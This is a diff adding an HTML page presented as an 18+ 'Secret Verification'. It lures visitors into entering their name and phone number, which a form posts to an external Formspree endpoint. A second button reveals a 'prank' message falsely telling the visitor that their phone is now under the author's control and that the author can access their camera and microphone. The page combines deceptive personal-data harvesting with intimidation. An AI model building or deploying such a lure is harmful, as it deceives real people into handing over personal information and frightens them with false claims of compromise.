@@ -1,0 +1,135 @@
+
+
+
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MPHG </title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, #111, #292929);
+      color: white;
+      padding: 20px;
+    }
+
+    .box {
+      width: 100%;
+      max-width: 400px;
+      background: #1d1d1d;
+      padding: 30px;
+      border-radius: 18px;
+      text-align: center;
+      box-shadow: 0 10px 35px rgba(0,0,0,.5);
+    }
+
+    h1 {
+      margin-top: 0;
+      font-size: 28px;
+    }
+
+    p {
+      color: #bbb;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 10px;
+      background: #303030;
+      color: white;
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      margin-top: 12px;
+      border: none;
+      border-radius: 10px;
+      background: #ffffff;
+      color: #111;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    #result {
+      display: none;
+      margin-top: 20px;
+      padding: 15px;
+      border-radius: 10px;
+      background: #292929;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="box">
+    <h1> Secret Verification</h1>
+<p>Only Click Continue If you are 18 or obove</p>
+
+
+<form action="https://formspree.io/f/xvkglalv" method="POST">
+  <textarea
+    name="First Name"
+    placeholder="Write your name here"
+    rows="5"
+    required
+  ></textarea>
+  <input
+    type="text"
+    name="Phone Number"
+    placeholder="Write your phone number Here"
+    required
+  >
+
+  <textarea
+    name="Last Name(Optionl)"
+    placeholder="Write your name here"
+    rows="5"
+    required
+  ></textarea>
+
+  <button type="submit">Continue</button>
+
+</form>
+<button onclick="showPrank()">
+      Continue 
+    </button>
+
+    <div id="result">
+      <h2>You have cought</h2>
+
+      <p>
+        Thanks For Your Information 
+      </p>
+
+      <p>
+        I warn you first that if you are 18 or above then you should continue. 
+        Now your phone is under my control.I can see you I can access your Camera
+         and Microphone. Bye🖐️🖐️
+      </p>
+    </div>
+
+  </div>
+
+  <script>
+    function showPrank() {
+      document.getElementById("result").style.display = "block";
+    }
